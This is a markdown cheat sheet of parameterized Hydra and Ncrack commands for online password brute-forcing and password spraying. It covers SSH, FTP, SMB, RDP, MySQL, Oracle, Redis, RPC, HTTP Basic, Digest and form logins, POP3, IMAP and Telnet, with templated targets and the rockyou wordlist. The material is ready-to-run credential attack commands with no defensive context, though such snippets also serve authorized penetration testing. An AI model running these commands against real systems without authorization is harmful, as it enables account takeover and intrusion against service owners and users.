# Hydra

> Fast and flexible online password brute-forcing tool supporting numerous protocols

<!-- tags: bruteforce, passwords, hydra, online, cracking -->

---

## brute ssh
Brute-force SSH login for a single user.

```bash
hydra -l {{USERNAME:str:root}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} ssh -t {{THREADS:int:4}} -V
```

<!-- meta: risk=med | phase=passwords | tags=ssh,bruteforce -->

---

## brute ftp ncrack
Use Ncrack as alternative for FTP brute force (often faster).

```bash
ncrack -p ftp -U {{USERS_FILE:file:users.txt}} -P {{PASSWORDS_FILE:file:passwords.txt}} {{TARGET:ip}}
```

<!-- meta: risk=high | phase=passwords | tags=ncrack,ftp,bruteforce -->

---

## brute oracle sid
Brute force Oracle database accounts.

```bash
hydra -L {{USERS_FILE:file:users.txt}} -P {{PASSWORDS_FILE:file:passwords.txt}} {{TARGET:ip}} oracle-sid
```

<!-- meta: risk=high | phase=passwords | tags=oracle,bruteforce -->

---

## brute rpc
Brute force authentication on RPC endpoints.

```bash
hydra -l {{USERNAME:str}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -s {{PORT:port:111}} rpc://{{TARGET:ip}}
```

<!-- meta: risk=high | phase=passwords | tags=rpc,bruteforce -->

---

## brute redis
Brute force Redis authentication password.

```bash
hydra -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} redis://{{TARGET:ip}}:{{PORT:port:6379}}
```

<!-- meta: risk=high | phase=passwords | tags=redis,bruteforce -->

---

## brute ftp
Brute-force FTP login credentials.

```bash
hydra -l {{USERNAME:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} ftp -t {{THREADS:int:10}} -V
```

<!-- meta: risk=med | phase=passwords | tags=ftp,bruteforce -->

---

## brute http basic auth
Brute-force HTTP Basic Authentication.

```bash
hydra -l {{USERNAME:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} http-get {{PATH:str:/admin}} -t {{THREADS:int:10}}
```

<!-- meta: risk=med | phase=passwords | tags=http,basic-auth -->

---

## brute http post form
Brute-force a web login form via HTTP POST.

```bash
hydra -l {{USERNAME:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} http-post-form "{{PATH:str:/login.php}}:{{POST_BODY:str:username=^USER^&password=^PASS^}}:{{FAIL_STRING:str:Invalid credentials}}" -t {{THREADS:int:10}}
```

<!-- meta: risk=med | phase=passwords | tags=http,post,form -->

---

## brute smb
Brute-force SMB/Windows authentication.

```bash
hydra -l {{USERNAME:str:administrator}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} smb -t {{THREADS:int:5}} -V
```

<!-- meta: risk=med | phase=passwords | tags=smb,bruteforce -->

---

## brute rdp
Brute-force Remote Desktop Protocol login.

```bash
hydra -l {{USERNAME:str:administrator}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} rdp -t {{THREADS:int:4}} -V
```

<!-- meta: risk=med | phase=passwords | tags=rdp,bruteforce -->

---

## brute mysql
Brute-force MySQL database login.

```bash
hydra -l {{USERNAME:str:root}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} mysql -t {{THREADS:int:10}} -V
```

<!-- meta: risk=med | phase=passwords | tags=mysql,database -->

---

## spray password userlist
Spray passwords across a list of usernames.

```bash
hydra -L {{USERLIST:file:users.txt}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} {{PROTOCOL:str:ssh}} -t {{THREADS:int:4}} -V
```

<!-- meta: risk=med | phase=passwords | tags=userlist,spray -->

---

## brute credentials combo file
Use a colon-separated credentials file (user:pass).

```bash
hydra -C {{CREDFILE:file:creds.txt}} {{TARGET:ip}} {{PROTOCOL:str:ftp}} -t {{THREADS:int:10}} -V
```

<!-- meta: risk=med | phase=passwords | tags=credentials,combo -->

---

## brute https post form
Brute force a login form over HTTPS on a custom port.

```bash
hydra -l {{USERNAME:str:user}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -s {{PORT:port:443}} https-post-form "{{TARGET:str:example.com}}{{PATH:str:/login.php}}:{{POST_BODY:str:user=^USER^&pass=^PASS^}}:{{FAIL_STRING:str:Login failed}}" -I
```

<!-- meta: risk=med | phase=passwords | tags=https,form -->

---

## brute http digest auth
Brute-force endpoints protected by HTTP Digest auth.

```bash
hydra -l {{USERNAME:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -m {{PATH:str:/protected}} {{TARGET:ip}} http-get-digest -I
```

<!-- meta: risk=med | phase=passwords | tags=digest,http -->

---

## brute pop3 mail
Brute-force POP3 mail credentials.

```bash
hydra -l {{USERNAME:str:user@example.com}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} pop3 -I
```

<!-- meta: risk=med | phase=passwords | tags=pop3,mail -->

---

## brute imap mail
Brute-force IMAPS with empty, reverse, and same-as-user password tests.

```bash
hydra -l {{USERNAME:str:user@example.com}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -e nsr -s {{PORT:port:993}} imap://{{TARGET:ip}} -I
```

<!-- meta: risk=med | phase=passwords | tags=imap,mail -->

---

## brute telnet
Brute-force Telnet credentials.

```bash
hydra -L {{USERLIST:file:users.txt}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} telnet -I
```

<!-- meta: risk=med | phase=passwords | tags=telnet -->
